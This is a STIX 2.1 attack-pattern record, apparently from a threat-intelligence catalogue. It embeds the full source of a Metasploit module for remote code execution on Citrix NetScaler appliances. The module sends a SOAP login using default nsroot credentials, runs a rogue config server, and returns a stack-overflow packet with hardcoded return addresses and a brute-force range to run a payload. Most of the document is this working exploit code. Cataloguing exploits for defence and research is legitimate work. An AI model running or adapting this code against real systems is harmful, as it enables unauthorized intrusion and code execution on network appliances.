{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--61bc03cc-dd08-49f1-b645-fe513af72893",
    "created": "2024-08-14T16:33:33.81772Z",
    "modified": "2024-08-14T16:33:33.817724Z",
    "name": "\"Citrix NetScaler SOAP Handler Remote Code Execution\"",
    "description": " This module exploits a memory corruption vulnerability on the Citrix NetScaler Appliance. The vulnerability exists in the SOAP handler, accessible through the web interface. A malicious SOAP requests can force the handler to connect to a malicious NetScaler config server. This malicious config server can send a specially crafted response in order to trigger a memory corruption and overwrite data in the stack, to finally execute arbitrary code with the privileges of the web server running the SOAP handler. This module has been tested successfully on the NetScaler Virtual Appliance 450010.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/misc/citrix_netscaler_soap_bof.rb",
            "external_id": "citrix_netscaler_soap_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Brute\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Citrix NetScaler SOAP Handler Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a memory corruption vulnerability on the Citrix NetScaler Appliance.\n        The vulnerability exists in the SOAP handler, accessible through the web interface. A\n        malicious SOAP requests can force the handler to connect to a malicious NetScaler config\n        server. This malicious config server can send a specially crafted response in order to\n        trigger a memory corruption and overwrite data in the stack, to finally execute arbitrary\n        code with the privileges of the web server running the SOAP handler. This module has been\n        tested successfully on the NetScaler Virtual Appliance 450010.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Bradley Austin', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'MinNops'        => 512,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'bsd',\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          [ 'NetScaler Virtual Appliance 450010',\n            {\n              'RwPtr'        => 0x80b9000, # apache2 rw address / Since this target is a virtual appliance, has sense.\n              'Offset'       => 606,\n              'Ret'          => 0xffffda94, # Try before bruteforce...\n              # The virtual appliance lacks of security mitigations like DEP/ASLR, since the\n              # process being exploited is an apache child, the bruteforce attack works fine\n              # here.\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xffffec00 }, # bottom of the stack\n                  'Stop'  => { 'Ret' => 0xfffdf000 }, # top of the stack\n                  'Step'  => 256\n                }\n            }\n          ],\n        ],\n      'DisclosureDate' => '2014-09-22',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the soap handler', '/soap']),\n        OptAddress.new('SRVHOST', [true, \"The local host to listen on. This must be an address on the local machine reachable by the target\", ]),\n        OptPort.new('SRVPORT', [true,  \"The local port to listen on.\", 3010])\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    })\n\n    if res && res.code == 200 && res.body && res.body =~ /Server Request Handler.*No body received/m\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    if ['0.0.0.0', '127.0.0.1'].include?(datastore['SRVHOST'])\n      fail_with(Failure::BadConfig, 'Bad SRVHOST, use an address on the local machine reachable by the target')\n    end\n\n    if check != Exploit::CheckCode::Detected\n      fail_with(Failure::NoTarget, \"#{peer} - SOAP endpoint not found\")\n    end\n\n    start_service\n\n    if target.ret\n      @curr_ret = target.ret\n      send_request_soap\n      Rex.sleep(3)\n\n      if session_created?\n        return\n      end\n    end\n\n    super\n  end\n\n  def brute_exploit(addrs)\n    @curr_ret = addrs['Ret']\n    send_request_soap\n  end\n\n  def send_request_soap\n    soap = <<-EOS\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<SOAP-ENV:Body>\n<ns7744:login xmlns:ns7744=\"urn:NSConfig\">\n<username xsi:type=\"xsd:string\">nsroot</username>\n<password xsi:type=\"xsd:string\">nsroot</password>\n<clientip xsi:type=\"xsd:string\">#{datastore['SRVHOST']}</clientip>\n<cookieTimeout xsi:type=\"xsd:int\">1800</cookieTimeout>\n<ns xsi:type=\"xsd:string\">#{datastore['SRVHOST']}</ns>\n</ns7744:login>\n</SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n    EOS\n\n    print_status(\"Sending soap request...\")\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path),\n      'data'   => soap\n    }, 1)\n  end\n\n  def on_client_data(c)\n    print_status(\"#{c.peerhost} - Getting request...\")\n\n    data = c.get_once(2)\n    req_length = data.unpack(\"v\")[0]\n\n    req_data = c.get_once(req_length - 2)\n    unless req_data.unpack(\"V\")[0] == 0xa5a50000\n      print_error(\"#{c.peerhost} - Incorrect request... sending payload anyway\")\n    end\n\n    print_status(\"#{c.peerhost} - Sending #{payload.encoded.length} bytes payload with ret 0x#{@curr_ret.to_s(16)}...\")\n\n    my_payload = Rex::Text.pattern_create(target['Offset'])\n    my_payload << [@curr_ret, target['RwPtr']].pack(\"V*\")\n    my_payload << payload.encoded\n\n    pkt = [my_payload.length + 6].pack(\"v\")\n    pkt << \"\\x00\\x00\\xa5\\xa5\"\n    pkt << my_payload\n    c.put(pkt)\n    c.disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-22",
    "x_mitre_platforms": [
        "bsd'"
    ]
}